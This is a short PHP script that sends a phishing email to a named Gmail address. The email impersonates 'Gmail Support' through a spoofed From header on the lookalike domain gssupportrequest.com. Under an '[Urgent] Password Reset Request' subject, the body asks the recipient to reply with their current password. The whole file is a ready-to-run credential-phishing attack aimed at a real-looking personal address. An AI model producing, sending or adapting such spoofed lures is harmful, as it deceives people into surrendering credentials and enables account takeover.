<?php
$to = "anikhilteja@gmail.com";
$subject = "[Urgent] Password Reset Request";
$txt = " Hi Nikhil, We reccieved a password reset request from your account. Could you reply with your current password and someone from our team will get in touch with you shortly.
<br>
Regards, <br>
Support Team";
$headers = "Gmail Support <gmailsupport@gssupportrequest.com>" . "\r\n";

mail($to,$subject,$txt,$headers);
?>